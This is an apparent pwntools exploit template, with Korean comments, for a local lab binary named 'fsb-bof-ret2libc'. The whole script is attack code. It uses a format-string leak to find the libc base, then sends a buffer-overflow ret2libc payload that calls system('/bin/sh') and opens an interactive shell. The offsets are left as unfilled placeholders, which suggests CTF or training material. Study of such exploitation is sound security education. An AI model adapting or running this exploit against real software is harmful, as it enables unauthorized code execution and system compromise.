#!/usr/bin/env python3
from pwn import *

context.update(arch='i386', os='linux')

binary = '/tmp/fsb-bof-ret2libc/vuln'
p = process(binary)

# 1) FSB leak
p.recvuntil(b'input1:\n')
p.sendline(b'%{leak_loc}$p')

leak = int(p.recvline().strip(), 16)
log.success(f'leak = {hex(leak)}')

# 2) libc base 계산
stdin_offset = {stdin_offset}
libc_base = leak - stdin_offset
log.success(f'libc_base = {hex(libc_base)}')

system = libc_base + {system_offset}
exit_  = libc_base +{exit_offset}
binsh  = libc_base + {binsh_offset}

log.info(f'system = {hex(system)}')
log.info(f'exit   = {hex(exit_)}')
log.info(f'binsh  = {hex(binsh)}')

# 3) BOF ret2libc
payload  = b'A' * {bof_offset}
payload += p32(system)
payload += p32(exit_)
payload += p32(binsh)

p.recvuntil(b'input2:\n')
p.sendline(payload)

# 4) shell
p.interactive()
